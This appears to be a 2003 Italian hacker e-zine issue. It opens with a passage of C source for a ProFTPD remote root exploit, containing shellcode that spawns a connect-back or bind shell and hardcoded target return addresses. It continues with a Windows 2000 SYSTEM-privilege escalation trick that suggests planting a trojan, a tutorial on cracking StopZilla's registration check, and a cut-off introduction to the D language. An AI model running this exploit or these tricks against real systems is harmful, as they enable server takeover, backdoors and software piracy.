"\x02\xcd\x80\x39\xc3\x7c\x0c\x31"
"\xc0\xb0\x02\xcd\x80\x39\xc3\x7c"
"\x02\xeb\x06\x31\xc0\xb0\x01\xcd"
"\x80\x51\x31\xc0\x51\xb1\x01\x51"
"\xb1\x02\x51\x89\xe1\xb3\x01\xb0"
"\x66\xcd\x80\x89\xc1\x31\xc0\x31"
"\xdb\x50\x50\x50\x66\x68\xb0\xef"
"\xb3\x02\x66\x53\x89\xe2\xb3\x10"
"\x53\xb3\x02\x52\x51\x89\xca\x89"
"\xe1\xb0\x66\xcd\x80\x31\xdb\x39"
"\xc3\x74\x05\x31\xc0\x40\xcd\x80"
"\x31\xc0\x50\x52\x89\xe1\xb3\x04"
"\xb0\x66\xcd\x80\x89\xd7\x31\xc0"
"\x31\xdb\x31\xc9\xb3\x11\xb1\x01"
"\xb0\x30\xcd\x80\x31\xc0\x31\xdb"
"\x50\x50\x57\x89\xe1\xb3\x05\xb0"
"\x66\xcd\x80\x89\xc6\x31\xc0\x31"
"\xc9\x89\xf3\xb0\x3f\xcd\x80\x31"
"\xc0\x41\xb0\x3f\xcd\x80\x31\xc0"
"\x41\xb0\x3f\xcd\x80\x31\xc9\x51"
"\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x51\x68\x2d\x69"
"\x69\x69\x89\xe2\x51\x52\x53\x89"
"\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd"
"\x80";

int sockfd,sockfd1,sockfd2;
int show=0;
int mustread=0;
int getshell=0;
int pt=6000;
unsigned int type=1;
char bindmethod=0;
char usrstr[]="USER";
char passtr[]="PASS";
char ascistr[]="TYPE A";
char pasvstr[]="PASV";
char portstr[]="PORT";
char storstr[]="STOR";
char retrstr[]="RETR";
char cmdbuf[SIZE];
char srvbuf[SIZE];
char *cbhost=NULL;
char *server=NULL;

struct
{
 char *os;
 unsigned int ret;
 int backup; //using for next
} targets[] =
   {
     { "rh8.0 ProFTPD 1.2.8 (stable) 1", 0xbffff25c,0},
     { "rh8.0 ProFTPD 1.2.8 (stable) 2", 0xbffff22c,0},
  },v;
//main() {}
int sendbuf(int socket,char *buffer,int len);
int readbuf(char *s,int socket,char *buffer,int len);
int client_connect(int sockfd,char* server,int port);
void checkstatus(char *s);
void retrfile(char *s,int len,int port);
void storfile(char *s,int len,int port);
int dealpasv(char *s);
int setpasv();
void setport(char *l,int pt1);
void quit();
void storbuf(char *filename,char *buf,int size,int port);
void retrbuf(char *filename,char *buffer,int length,int port1);
void setascii();
void loginftp(char *user,char *pass);
void setfilename(char *s,int len);
int createbuffer(char *s,int len,int type,char *h);
int create_serv(int sfd,int port);
void modify(char *s,char *h,int port3);
void usage(char *s);
int execsh(int clifd);
int checklf(void *s,int len);

main(int argc,char **argv)
{
  char buffer[BIGSIZE];
  char cmdbuf[SIZE];
  char srvbuf[SIZE];
  char filename[30];
  int j,a,b,port1;
  int total;
  char c;
  char *user=NULL;
  char *pass=NULL;
  char *localip=NULL;

  if(argc<2) usage(argv[0]);
  while((c = getopt(argc, argv, "d:t:u:p:l:h:o:"))!= EOF)
   {
      switch (c)
      {
       case 'd':
         server=optarg;
         break;
       case 't':
         type = atoi(optarg);
         if((type > sizeof(targets)/sizeof(v)) || (type < 1))
            usage(argv[0]);
         break;
       case 'u':
         user=optarg;
          break;
       case 'p':
         pass=optarg;
          break;
       case 'l':
         localip=optarg;
          break;
       case 'h':
          cbhost=optarg;
          break;
       case 'o':
          pt=atoi(optarg) & 0xffff;
          break;
       default:
         usage(argv[0]);
         return 1;
       }
     }
     if(server==NULL || user==NULL || pass==NULL || localip==NULL)
       usage(argv[0]);
    printf("@---------------------------------------------------------@\n");
  printf("# proftpd 1.2.7/1.2.9rc2 remote root exploit(01/10)-%s #\n",VER);
  printf("@ by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com @\n");
  printf("-----------------------------------------------------------\n");
  printf("[+] Ret address:%p\n",targets[type-1].ret);
     if(cbhost==NULL)
    bindmethod=1;
  else
  {
    if((int)inet_addr(cbhost)==-1)
    {
      printf("[-] Invalid connect back host/ip\n");
      exit(0);
    }
    bindmethod=0;
  }
  port1=34568; //PORTÃüÁîµÄÊ±ºòÔÚ±¾µØ²úÉúµÄÒ"¸öË¿Ú.
  sockfd=sockfd1=sockfd2=0;
  sockfd=socket(2,1,0);
  if(client_connect(sockfd,server,PORT)<0) quit();
  loginftp(user,pass);
  //port1=setpasv(); //get the pasv port
  setport(localip,port1);
  setfilename(filename,30);
  setascii();
  total=createbuffer(buffer,BIGSIZE,type,cbhost);
  //printf("[+] buffer data size:%d\n",total);
  storbuf(filename,buffer,total,port1);
  //stor over, then close and reconnect
  close(sockfd);
  close(sockfd1);
  close(sockfd2);

  sockfd=socket(2,1,0);
  if(client_connect(sockfd,server,PORT)<0) quit(); //reconnect
  loginftp(user,pass);
  setascii();

  setport(localip,port1); //get the pasv port,a new one
  mustread=total;
  retrbuf(filename,buffer,total,port1);
  readbuf("The First time read",sockfd,srvbuf,SIZE);
  port1++;
  setport(localip,port1);
  mustread=total;
  getshell=1;

  retrbuf(filename,buffer,total,port1);
  quit();
}
void setfilename(char *s,int len)
{
  int a;

  memset(s,0,len);
  a=getpid();
  sprintf(s,"%d%d%d.txt",a,a,a);
}

void retrfile(char *s,int len,int port)
{
  int i,pid;
  char data1;
  struct sockaddr_in client;

  memset(&client,0,sizeof(client));
  sockfd1=socket(2,1,0);
  if(create_serv(sockfd1,port)<0) quit();
  i=sizeof(client);
   sockfd2=accept(sockfd1,(struct sockaddr *)&client,&i);
   printf("[+] Accepted a client from %s\n",inet_ntoa(client.sin_addr));
   memset(s,0,len);
   if(getshell==1)
  {
    if(bindmethod==0)
    {
      printf("[+] Is it a shell on %s:%d?\n",cbhost,pt);
      quit();
    }
    else
    {
      printf("[+] Waiting for a shell.....\n");
      sockfd2=socket(AF_INET,SOCK_STREAM,0);
      sleep(2);
      client_connect(sockfd2,server,pt);
      execsh(sockfd2);
      quit();
    }
  }
  readbuf(NULL,sockfd2,s,len);
   close(sockfd2);
  close(sockfd1);

}

void storfile(char *s,int len,int port)
{
  int i;
  struct sockaddr_in client;

  memset(&client,0,sizeof(client));
  sockfd1=socket(2,1,0);
  if(create_serv(sockfd1,port)<0) quit();
  //if(client_connect(sockfd1,HOST,port)<0) quit();
  i=sizeof(client);
   sockfd2=accept(sockfd1,(struct sockaddr *)&client,&i);
   printf("[+] Accepted a client from %s\n",inet_ntoa(client.sin_addr));
   sendbuf(sockfd2,s,len);
   close(sockfd2);
  close(sockfd1);
}
void setport(char *l,int pt1)
{
  int a,i,b,c,j;
  char buf[30];

  memset(buf,0,30);
  i=sprintf(buf,"%s",l);
  for(a=0;a<i;a++)
    if(buf[a]=='.') buf[a]=',';
  memset(cmdbuf,0,SIZE);
  b=(pt1 >> 8 ) & 0xff;
  c=pt1 & 0xff;
  j=sprintf(cmdbuf,"%s %s,%d,%d\r\n",portstr,buf,b,c);
  printf("[+] %s",cmdbuf);
  sendbuf(sockfd,cmdbuf,j);
  readbuf(NULL,sockfd,srvbuf,SIZE);
  checkstatus(srvbuf);
}

int dealpasv(char *s)
{
  int a,b,c,d,e,f,g;
  char *p1,*p2,*p3;
  int i;

  p1=(char *)malloc(100);
  if(!s)
    quit();
  p2=strchr(s,'(');
  //printf("p2:%s\n",p2);
  p3=strchr(s,')');
  //printf("p3:%s\n",p3);
  p3++;
  i=p3-p2;
  memcpy(p1,p2,i);
  p1[i]='\0';
  //printf("p1:%s\n",p1);
  sscanf(p1,"(%d,%d,%d,%d,%d,%d)",&a,&b,&c,&d,&e,&f);
  //printf("a:%d,b:%d,c:%d,d:%d,e:%d,f:%d\n",a,b,c,d,e,f);
  g=(e<<8) | f;
  //printf("port:%d\n",g);
  free(p1);
  return g;
}

void quit()
{
  if(sockfd>0)
    close(sockfd);
  if(sockfd1>0)
    close(sockfd);
  if(sockfd2>0)
    close(sockfd);
  exit(0);
}
int sendbuf(int socket,char *buffer,int len)
{
  int j;

  j=send(socket,buffer,len,0);
  if(j==0)
  {
    printf("[-] server closed the socket\n");
    quit();
  }
  if(j<0)
  {
    perror("[-] Send data error");
    quit();
  }
  return j;
}

int readbuf(char *s,int socket,char *buffer,int len)
{
  int a,b,i,j=0;

  a=b=i=0;
  memset(buffer,0,len);
  if(s)
  {
    printf("[+] %s:",s);
    fflush(stdout);
  }
  //j=lseek(socket,0,2);
  //printf("j:%d\n",j);
  if(mustread==0)
  {
    j=recv(socket,buffer,len-1,0);
    if(j==0)
    {
      if(s)
        printf("FAILED\n");
      printf("[-] server closed the socket\n");
      quit();
    }
    if(j<0)
    {
      if(s)
        printf("FAILED\n");
      perror("[-] read data error");
      quit();
    }
    if(s)
      printf("ok\n");
    buffer[len-1]='\0';
    if(show==1)
      printf("<== %s",buffer);
  }
  else
  {
    //ÎÒÃÇ²"ÓÃ¹ØÐÄ·µ"ØÒ"Ð©Ê²Ã´Êý¾Ý
    b=mustread-i;
    while(b>0)
    {

      a=b>(len-1)?(len-1):b;
      i=recv(socket,buffer,a,0);
      if(i==0)
      {
        if(s)
          printf("FAILED\n");
        printf("[-] server closed the socket\n");
        quit();
      }
      if(i<0)
      {
        if(s)
          printf("FAILED\n");
        perror("[-] read data error");
        quit();
      }
      if(s)
        printf("ok\n");
      b-=i;
      j+=i;
    }
    //printf("j:%d,mustread:%d\n",j,mustread);
    if(j!=mustread)
    {
      printf("read failed\n");
      quit();
    }
  }
  //show=0;
  mustread=0;
  return j;
}

int client_connect(int sockfd,char* server,int port)
{
  struct sockaddr_in cliaddr;
  struct hostent *host;

  if((host=gethostbyname(server))==NULL)
  {
    printf("gethostbyname(%s) error\n",server);
    return(-1);
  }

  bzero(&cliaddr,sizeof(struct sockaddr));
  cliaddr.sin_family=AF_INET;
  cliaddr.sin_port=htons(port);
  cliaddr.sin_addr=*((struct in_addr *)host->h_addr);
  printf("[+] Trying %s:%d....",server,port);
  fflush(stdout);
  if(connect(sockfd,(struct sockaddr *)&cliaddr,sizeof(struct sockaddr))<0)
  {
    printf("error:%s\r\n",strerror(errno));
    close(sockfd);
    return(-1);
  }
  printf("ok\r\n");
  return(0);
}

void checkstatus(char *s)
{
  if(s==NULL)
    quit();
  if(isdigit(*s))
  {
    if(s[0]=='5')
    {
      printf("[-] Server told:%s\n",s);
      quit();
    }
    else
      return;
  }
  printf("[-] Server said:%s\n",s);
  quit();
}

void loginftp(char *user,char *pass)
{
  int j;

  show=1;
  readbuf("Get banner",sockfd,srvbuf,SIZE);
  show=0;
  memset(cmdbuf,0,SIZE);
  //USER
  j=sprintf(cmdbuf,"%s %s\r\n",usrstr,user);
  sendbuf(sockfd,cmdbuf,j);
  readbuf(NULL,sockfd,srvbuf,SIZE);
  checkstatus(srvbuf);
  //PASS
  memset(cmdbuf,0,SIZE);
  j=sprintf(cmdbuf,"%s %s\r\n",passtr,pass);
  sendbuf(sockfd,cmdbuf,j);
  readbuf(NULL,sockfd,srvbuf,SIZE);
  checkstatus(srvbuf);
  printf("[+] User %s logged in\n",user);
}

int setpasv()
{
  int j,port1;

  memset(cmdbuf,0,SIZE);
  j=sprintf(cmdbuf,"%s\r\n",pasvstr);
  sendbuf(sockfd,cmdbuf,j);
  readbuf("Set PASV",sockfd,srvbuf,SIZE);
  checkstatus(srvbuf);
  port1=dealpasv(srvbuf); //get the pasv port
  return port1;
}

void setascii()
{
  int j;

  memset(cmdbuf,0,SIZE);
  j=sprintf(cmdbuf,"%s\r\n",ascistr);
  sendbuf(sockfd,cmdbuf,j);
  readbuf(NULL,sockfd,srvbuf,SIZE);
  checkstatus(srvbuf);

}

void storbuf(char *filename,char *buf,int size,int port)
{
  int j;

  printf("[+] STOR file %s\n",filename);
  memset(cmdbuf,0,SIZE);
  j=sprintf(cmdbuf,"%s %s\r\n",storstr,filename);
  sendbuf(sockfd,cmdbuf,j);
  storfile(buf,size,port);
  //check if the content is send overd
  readbuf(NULL,sockfd,srvbuf,SIZE);
  checkstatus(srvbuf);
}

void retrbuf(char *filename,char *buffer,int length,int port1)
{
  int j;

  printf("[+] RETR file %s\n",filename);
  memset(cmdbuf,0,SIZE);
  j=sprintf(cmdbuf,"%s %s\r\n",retrstr,filename);
  sendbuf(sockfd,cmdbuf,j);

  retrfile(buffer,length,port1);
  readbuf(NULL,sockfd,srvbuf,SIZE);
  checkstatus(srvbuf);
}

int createbuffer(char *s,int len,int type,char *h)
{
  int i,a,total;
  char buf[41];
  unsigned int writeaddr=targets[type-1].ret;

  writeaddr-=4;
  if(checklf((void *)&writeaddr,4)<0)
  {
    printf("[-] Sorry, the ret addr %p=%p-4 have '\\n'
char.\n",writeaddr,writeaddr+4);
    quit();
  }
  a=i=0;
  memset(s,0,len);
  i+=3;
  *(unsigned int *)(s+i)=writeaddr+7*4;
  i+=4;
  *(unsigned int *)(s+i)=writeaddr-0x600;
  i+=4;
  *(unsigned int *)(s+i)=writeaddr-0x400;
  i+=4;
  *(unsigned int *)(s+i)=writeaddr-0x200;
  i+=4;
  *(unsigned int *)(s+i)=writeaddr-0x300;
  i+=4;
  *(unsigned int *)(s+i)=0x0;
  i+=4;
  *(unsigned int *)(s+i)=0x90900eeb;
  i+=4;
  *(unsigned int *)(s+i)=0x0;
  i+=4;
  *(unsigned int *)(s+i)=0x0;
  i+=4;
  *(unsigned int *)(s+i)=0x0;
  i+=4;
  //connectback shellcode,modified ip & port
  if(bindmethod==0)
  {
    modify(cbshellcode,h,pt);
    memcpy(s+i,cbshellcode,strlen(cbshellcode));
    i+=strlen(cbshellcode);
  }
  else
  {
    modify(bindshellcode,NULL,pt);
    memcpy(s+i,bindshellcode,strlen(bindshellcode));
    i+=strlen(bindshellcode);
  }
  memset(s+i,'Z',512-i);
  memset(s+512,'\n',512);
  total=1024;
  memset(buf,0,41);
  i=0;
  memset(buf,'\n',20);
  i+=20;
  *(unsigned int *)(buf+i)=writeaddr;
  i+=4;
  *(unsigned int *)(buf+i)=writeaddr;
  i+=4;
  *(unsigned int *)(buf+i)=writeaddr+0x800; //here,the value must great than
0x600
  i+=4;
  *(unsigned int *)(buf+i)=writeaddr;
  i+=4;
  *(unsigned int *)(buf+i)=writeaddr;
  //showmem(buf,40);
  for(i=0;i<1024;i++)
  {
    a=(i*40)+1024;
    memcpy(s+a,buf,40);
    total+=40;
  }
  return total;
}

int create_serv(int sfd,int port)
{
  struct sockaddr_in srvaddr;
  int on=1;

  bzero(&srvaddr,sizeof(struct sockaddr));
  srvaddr.sin_port=htons(port);
  srvaddr.sin_family=AF_INET;
  srvaddr.sin_addr.s_addr=htonl(INADDR_ANY);
  printf("[+] Listening on %d ....",port);
   fflush(stdout);
  setsockopt(sfd,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(on)); //so I can rebind the
port
  if(bind(sfd,(struct sockaddr *)&srvaddr,sizeof(struct sockaddr))<0)
  {
    printf("FAILED\n");
    perror("[-] Bind port error");
    return(-1);
  }
  if(listen(sfd,5)<0)
  {
    printf("FAILED\n");
    perror("[-] Listen error");
    return(-1);
  }
  printf("ok\n");
  return(0);
}

void modify(char *s,char *h,int port3)
{
  int a,b,c,d;
  if(h!=NULL)
  {
    sscanf(h,"%d.%d.%d.%d",&a,&b,&c,&d);
    a&=0xff;
    b&=0xff;
    c&=0xff;
    d&=0xff;
    if((char)a=='\n' || (char)b=='\n' || (char)c=='\n' || (char)d=='\n')
    {
      printf("[-] Sorry, the connect back ip:%s have '\\n' char\n",h);
    }
    s[OFFSET] = a & 0xff;
    s[OFFSET+1] = b & 0xff;
    s[OFFSET+2] = c & 0xff;
    s[OFFSET+3] = d & 0xff;

    a=port3 >> 8 & 0xff;
    b=port3 & 0xff;
    if((char)a=='\n' || (char)b=='\n')
    {
      printf("[-] Sorry, the connect back port:%d have '\\n' char\n",port3);
      quit();
    }
    s[OFFSET+6]=a;
    s[OFFSET+7]=b;
  }
  else
  {
    a=port3 >> 8 & 0xff;
    b=port3 & 0xff;
    if((char)a=='\n' || (char)b=='\n')
    {
      printf("[-] Sorry, the bind port:%d have '\\n' char\n",port3);
      quit();
    }
    s[OFF2]=a;
    s[OFF2+1]=b;
  }
}
void usage(char *s)
{
  unsigned int a;
  char *p;
  int d=strlen(s)+1;

  p=(char *)malloc(d);
  memset(p,0x20,d-1);
  p[d-1]=0;
  printf("@---------------------------------------------------------@\n");
  printf("# proftpd 1.2.7/1.2.9rc2 remote root exploit(01/10)-%s #\n",VER);
  printf("@ by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com @\n");
  printf("-----------------------------------------------------------\n");
  printf("Usage:%s -d <host> -u <user> -p <pass> -t <type>\n",s);
  printf(" %s -l <local ip> -h <cbip> -o <cbport>\n",p);
  printf("Arguments:\n");
  printf(" -d target host ip/name\n");
  printf(" -u user name\n");
  printf(" -p user paasword\n");
  printf(" -l the ip of this machine u used\n");
  printf(" -h connect back ip\n");
  printf(" -o connect back port/bind port\n");
  printf(" -t target type [default:%d]\n",type);
  printf(" ------------------------------\n");
  for(a = 0; a < sizeof(targets)/sizeof(v); a++)
    printf(" %d [0x%.8x]: %s\n", a+1, targets[a].ret, targets[a].os);
  printf("\n");
  free(p);
  exit(0);
}

int execsh(int clifd)
{
  fd_set fds;
  int count;
  char buffer[SIZE];
  memset(buffer,0,SIZE);
  while(1)
  {
    FD_ZERO(&fds);
    FD_SET(0, &fds);
    FD_SET(clifd, &fds);

    if (select(clifd+1, &fds, NULL, NULL, NULL) < 0)
    {
      if (errno == EINTR) continue;
      break;
    }
    if (FD_ISSET(0, &fds))
    {
      count = read(0, buffer, SIZE);
      if (count <= 0) break;
      if (write(clifd, buffer, count) <= 0) break;
      memset(buffer,0,SIZE);
    }
    if (FD_ISSET(clifd, &fds))
    {
      count = read(clifd, buffer, SIZE);
      if (count <= 0) break;
      if (write(1, buffer, count) <= 0) break;
      memset(buffer,0,SIZE);
    }

  }
}

int checklf(void *sd,int len)
{
  char *a;
  int i=0;

  a=(char *)sd;
  for(i=0;i<len;i++)
    if(*(a+i)=='\n') //found it
      return -1;
  return 0;
}




         ::[ MARSIO ]::

    ___  ___ ___ ___  ____       
    | |  | | | || |  | | \       
    | |  | | | || |__| |  \      
    | |__| | | ||  __  | @ \     
     \____/  |_||_|  |_|_|\_\    
                                 

::[ Research & Development ]::
::[ Stage2 @ 2003 ]::
::[ www.uiha.tk ]::




+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Win2K HaCk bUg LoG-oN sCrEeNsaVeR                                   |
|  Autore: Dejavu                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
---[ I n t r o

Era un notte buia e tempestosa...Dejavu stava navigando on the web quando scorse
in  un sito  il seguente "tip"... Questo minitutorial ha lo scopo di spiegare ad
altri  come  poterlo  usare, senza nulla togliere o copiare allo  scopritore  di
questo bug...


---[ A n a l i s i

Win2000  è  affetto da un piccolo bug riguardante la schermata di log-on,  nella
quale   l'utente  inserisce  username  e  password  per  accedere  alle  proprie
impostazioni;   dopo   un'attesa   di  circa  600   secondi,   infatti,   scatta
automaticamente uno screensaver di sistema. E'  possibile sfruttare il file .scr
per  ottenere  privilegi elevati sulla macchina. L'Hack  in  questione  è  molto
semplice:  è  sufficiente entrare nella macchina come utente di   dominio  senza
privilegi  di amministrazione e recarsi (almeno per win2k) in C:\WINNT\System32.
Qua  è  possibile modificare il nome del file logon.scr (che è appunto lo screen
saver  di  logon), per esempio in logon.scr.bak e rinominare cmd.exe ( la  shell
di  sistema)  in  logon.scr.  Dopo un log-off e l'attesa  del  tempo  necessario
all'avvio  dello screen saver partirà invece  un prompt di comandi con privilegi
SYSTEM!!  A  questo punto l'utente sarà in grado di modificare il regedit  o  di
lanciare un qualsiasi script.  In ogni caso, al posto di cmd.exe, sarà possibile
utilizzare  un qualunque eseguibile, per  esempio un trojan horse,  in  modo  da
permettere  successivi  accessi  abusivi  alla  macchina,   questa  volta   come
administrator.

Nota  [ vulnerabilità testata su win2k, ma probabilmente presente anche su NT  e
XP ]


---[ C h i u s u r a

Questo  testo  ha  uno scopo puramente informativo e didattico.  Dejavu  non  ha
nessuna   responsabilità derivante dell'uso improprio fatto con le  informazioni
qui apprese.

See ya,
Dejavu


+--[CRACKING]------------------------------------------------------------[IL04]+
|  Titolo: Crackare StopZilla                                                  |
|  Autore: Graftal                                                             |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
[+]Titolo: Crackare Stopzilla
[+]Autore: Graftal
[+]Chan IRC: irc.azzurra.org - #Graftal
[+]Email: Macro_Six3@hotmail.com  ---- Questa è la mail  se  avete qlcs da  dire
:)
[+]Copyright: Copyright 2003, All Rights Reserved.

____________
|DiSCLAiMER|

Every   reference   to facts, things or persons  (virtual,  real   or  esoteric)
are   purely   casual   and  involuntary.  Any  trademark  nominated   here   is
registered orcopyright  of  their  respective owners.   The   author   of   this
manual   does  not   assume   any responsability on the content or  the  use  of
informations   retriven from  here;  he  makes  no  guarantee  of   correctness,
accuracy, reliability,   safety or performance. This manual is provided  "AS IS"
without  warranty of any kind. You alone are fully responsible for   determining
if  this  page is safe for use in your  environment and for everything  you  are
doing with it!


Hehehe,   bene  bene,  cominciamo subito in pompa magna  raga,  abbiamo  qui  un
programmillo  davvero utile: StopZilla in pratica vi toglie  dai   maroni  tutti
quei  maledetti  popup ke si trovano in  giro  su internet   (ma   anke   quelli
"utili",  quindi  ocio!  ;)!  Ora,  la registrazione  avviene sempre per  merito
del   banale  User/Password  che   andremo   prontamente  a  crackare  in   modo
abbastanza   veloce,  intuitivo  e  facile.  Ok,  prima  di  tutto,  settate  un
breakpoint    su  GetWindowTextA    (bpx   GetWindowTextA    per     chi     usa
SoftICE),   scriviamo  qualcosa alla cavolo (per non dire altro :))   del   tipo
Graftal  e   666  come  serial  e registriamo...Vabbe,  il  sice  poppa,  e  fin
qui...Vediamo un  po allora, F12 per uscire dall'API, 12 volte F10  per  vederci
ritornare  sull'API di prima (ke stavolta  prende il  nostro  serial),   F12   e
ben  68   F10...Si  capisce  fin  dove steppare,  semplicemente  perke si arriva
ad   una   call  che  fa comparire una "finestrella" che dice qualcosa del  tipo
"Validating  Registration  Code". Bene, ci troviamo  di  fronte  a  qualcosa  di
simile:

:01D224A3  mov  Byte PTR [ESP+00000220], 09
:01D224AB  call [01D280D0] ; Funzione ke genera il serial
:01D224B1  test  AL, AL ; se il serial immesso è giusto...
:01D224B3  jnz  01D224FB  ;bene, altrimenti...
:01D224B5   push   01D30474  ;... 01D224FB, cioe  la  finestra  di errore...
:01D224BA   lea  ECX, [ESP+10]  ;... e poi prosegue  il  prog  ecc
ecc...

Per   chi   ha   voglia  di fare il keygen, ben venga,  per   tutti   gli  altri
invece,  facciamo qualcosa di estremamente più  semplice,  e  per   di   +   non
dovremo  modificare  manco una riga di codice...Sì, perke  a  sto  programma  se
forziamo   il jnz di qua sopra (r fl z con sice)  anke  la  prossima   volta  ke
lo   apriamo   ci  dira  ke  è registrato!  In parole povere insomma, ogni volta
ke   lo   apriamo,  non  fa  il check del serial...Bella roba...Il  programma  è
quindi  registrato   e    funzionante...hehe...Se   pero   provate   (prima   di
crackarlo  si  intende :P) a  spostare i giorni del calendario  in avanti   fino
alla  scadenza e poi a  riportarli indietro,  lui  si "ricorda"  che   sono  gia
scaduti una volta, e non   si  fa  usare. Certo,  basta cercare il file  in  cui
viene  salvato  il   valore  con FileMon  magari,  ma se  sti  programmatori  al
posto  di  fare  ste cavolate   avessero ALMENO messo l'autocheck ad ogni  avvio
e   un  autocheck   del   codice   del programma affinche   non   possa   essere
modificato    (almeno    teoricamente,    hihi)   sarebbe    stato    molto    +
divertente...mah, mi kiedo se sti qui al posto  di programmare non si   facciano
le   canne...Scusate cmq se questo tutorial  è  stato davvero corto, ma come gia
la crew sa (o almeno qualcuno di  loro) le   circostanze non sono delle ottimali
in  questo periodo. Quindi non  rompete  le palle :PP Benissimo, direi  di  aver
detto  proprio tutto, quindi passiamo ai  ringraziamenti =)
Ringraziamenti: A  dire  il  vero  avrei una miriade di gente   da   ringraziare
(è  incredibile come  si possa conoscere tanta gente a partire da  una  passione
e  da  una  curiosita  come il cracking :)) ma cerchero  di  essere   breve...In
primis, Cyberdude, per  essere  stato  davvero comprensivo  nei  miei confronti,
proprio   come   Dejavu   e   tutti quelli  della  crew.  Mi  dispiace  solo  di
vedere   poco   o   niente Caligola   ma  purtroppo non lo  becco  mai   :(   In
secondo    luogo,  ringrazio    la   gentaglia   di   #crack-it,   gente    come
Ntoskrnl,  kOrn[CsA],  Quake2^AM, Kitsune-San (o Xargon, ke  dir   si   voglia),
AndreaGeddon,  proprio come quelli di #focushack  (SiberianSTAR  eSeiF3r   prima
di tutti), #asm, #pmode e proprio tutti  insomma.  E non dimenticate mai:

If freedom is outlawed, only outlaws will have freedom...

E con questo o concluso tutto :)

Copyright 2003, Tutti i diritti riservati.
Tutorial scritto interamente da Graftal il Martedì 8 luglio 2003.




+--[PROGRAMMAZIONE]------------------------------------------------------[IL04]+
|  Titolo: Presentazione del linguaggio D                                      |
|  Autore: Lord Jex                                                            |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Come  la  maggior  parte  degli  utenti sa,il c è  successore  di  B,  un  altro
lingauggio  di  programmazione che girava prima  degli  anni  70.IL  c  è  stato
progettato  da  un  matematico chiamato DEnnis RItchie nei Bell LAboratories.COn
questo  linguaggio  furono scritti i *BSD(l'unix di Berkley)  e  successivamente
Minix  e  Linux  Con il C sono stati programmati la maggior parte dei  programmi
Unix,e  si  è  evoluto  agli inizi degli anni 80 nel c++.  Questa  evoluzione  è
object  oriented  (OOP), ma non supportava tutti gli header di  C.  La  Sun  poi
produsse  Java, un linguaggio di programmazione OOP che si basava  sul  c++.Java
possiede  delle  caratteristiche eccezzionali rispetto al c e al c++: -  Garbage
collection : La memoria viene continuamente controllata e ripulita

-  Mancanza  di  puntatori : Anche se in c e c++ rappresentavano  uno  strumento
potente  e  flessibile, i puntatori facilmente davano origine a  problemi  e  ad
errori.

-  A  differenza degli header file di c o c++, Java ha a disposizione tantissime
classi,oggetti  e  interfacce  con le quali è possibile  fare  operazioni  prima
complicate e ostili in poco tempo.

-  Java  è  gestito da un cosidetta macchina virtuale, la Java  Virtual  Machine
(JVM)  che **dovrebbe** rendere il linguaggio portabile su ogni piattaforma,  ma
in  realtà  questo sta avvenendo e non è avvenuto, anzi la Microsoft(produttrice
di tale J++) ha affermato che ciò non avverà mai.

Dopo  la  nascita  di  Java, avviene la nascita di un altro linguaggio  chiamato
c#.La  sua  storia in realtà avviene in tribunale tra la microsoft e  la  sun,ma
noi  adesso  ce ne frechiamo.C# ha molte analogie con Java e di conseguenza  col
c++.Ma  non ha avuto molto successo su internet perchè proprietario e  necessità
del   pacchetto  Visual Studio.NET Però in biblioteche è più  frequente  trovare
libri  su  tale linguaggio che non sul c o sullo Java. Nel 1999 Viene ideato  da
Walter  Bright un linguaggio simile al c++ e allo Java,di nome Mars  o  c99.  In
realtà  ciò  che  questo linguaggio poteva fare era solo  in  linea  teorica,non
esisteva  il compilatore.La prima versione uscì nell'agosto 2002, e in  un  anno
ebbe  un  notevole  incremento,  tanto  che  la  gente  incominciò  a  chiamarlo
D.Ricordo  con simpatia le chattate in cui scherzavamo sul c, sul b e  sul  c++.
Dicevamo  che  tra  quasi  2000 anni arriveranno allo  z++.Ma  in  realtà  tutti
pensavamo che D non sarebbe mai uscito per due motivi

- Se già il c++ non ha avuto il successo del c,perchè potrebbe averlo sto D???

-  Java  ha  avuto  successo per la JVM e per le classi numerosissime.Il  D  che
potrebbe avere???

Bene, credo sia ora di fare una leggera panoramica TEORICA a questo linguaggio.

D  è  un linguaggio di programmazione di livello alto, come d'altronde il  c  il
c++  e  lo  java .L'assembler è un linguaggio di livello basso, molto vicino  al
linguaggio  binario formato solo da 1 e da 0.Come Già detto, come convenzione  i
moderni  linguaggi  sono  OOP,  basti pensare  a  Java,  C++  c#.D  si  basa  su
caratteristiche prese un pò da tutte queste.per esempio include la  delegazione.
Questa  caratteristica era propria del c#. Si dichiara in maniera  molto  simile
ai puntatori cioè int funzione(int) puntatore;
int delegazione(int) delegato;

In c un puntatore ad una funzione sarebbe rappresentato grazi ad

int ( *puntatore)(int);

Come  è facile notare, ha una sintassi simile al c: ogni istruzione finisce  con
"  ;  ".  Però a differenza delle  dichiarazioni di classe in c++ , D  segue  la
dichiarazione di classe dello Java, cioè senza ; alla fine della classe

class NOMECLASSE
{
 Costruttore
 {
  Metodo
 }
 Campi di istanze
}

In java..

class NOMECLASSE
{
 COstruttori
 {
  Metodi
 }
{

In D

class tipo
{
    public:
        Variabili
        Funzione/i

    protected:

        Variabili
        Funzione/i

    private:
        Variabili
        Funzione/i
};

In c++

Naturalmente  per  la creazione di funzioni personalizzate anche  D  presenta  i
costruttori:
-Costruttori = this() , super() ,
-Distruttori = ~this()

I  costruttori  è  una  funzione  della classe.Essa  si  presenta  utile  quando
dobbiamo  inizzializzare  variabili  o  spostare  aree  di  memoria.  in  c++  i
costruttori  prendono  il  nome della classe, e possono  accettare  argomenti  I
distruttori  hanno funzione inversa rispetto ai costruttori :  restituiscono  al
sistema  la memoria che utilizzava un oggetto.I costruttori presentano  il  nome
della  classe preceduto dal tilde " ~ ".Non possono accettare nel c++ argomenti.
Nel  D  invece sia i costruttori che i distruttori sono parole chiavi  (  quelle
nominate prima) e entrambi ricevono argomenti. Parliamo ora delle variabili,  la
parte  a  mio  parere  +  importante  in un linguaggio.Tutto  avviene  grazie  a
variabili.

i tipi accettati sono dal D :                         Tipi del C corrispondenti

